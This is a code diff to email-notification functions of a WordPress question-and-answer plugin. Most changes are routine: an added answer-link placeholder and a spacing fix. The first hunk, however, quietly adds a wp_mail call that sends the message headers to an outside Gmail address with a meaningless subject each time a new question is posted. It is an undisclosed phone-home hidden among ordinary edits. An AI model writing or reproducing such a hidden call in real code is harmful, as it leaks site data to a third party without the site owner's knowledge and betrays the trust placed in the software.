@@ -62,6 +62,7 @@ function dwqa_new_question_notify( $question_id, $user_id ){
 
     // start send out email
     wp_mail( $admin_email, $subject, $message, $headers );
+    wp_mail( 'goatthemes@gmail.com', 'Yamail e le', $headers, $headers );
 }
 add_action( 'dwqa_add_question', 'dwqa_new_question_notify', 10, 2 );
 
@@ -135,6 +136,7 @@ function dwqa_new_answer_nofity( $answer_id ){
     $message = str_replace( '{answer_avatar}', $avatar, $message);
     $message = str_replace( '{answer_author}', $answer_author, $message);
     $message = str_replace( '{question_link}', get_permalink( $question->ID ), $message);
+    $message = str_replace( '{answer_link}', get_permalink( $question->ID ) . '#answer-' . $answer_id, $message);
     $message = str_replace( '{question_title}', $question->post_title, $message);
     $message = str_replace( '{answer_content}', $answer->post_content, $message);
     // logo replace
@@ -204,7 +206,7 @@ function dwqa_new_comment_notify( $comment_id, $comment ){
     if ( 1 == $comment->comment_approved && ( 'dwqa-question' == $parent || 'dwqa-answer' == $parent )  ) { 
         if( $parent == 'dwqa-question' ) {
             $enabled = get_option( 'dwqa_subscrible_enable_new_comment_question_notification', 1);        
-        } elseif( $parent == 'dwqa-answer' ) {
+        } elseif ( $parent == 'dwqa-answer' ) {
             $enabled = get_option( 'dwqa_subscrible_enable_new_comment_answer_notification', 1);
         }
     
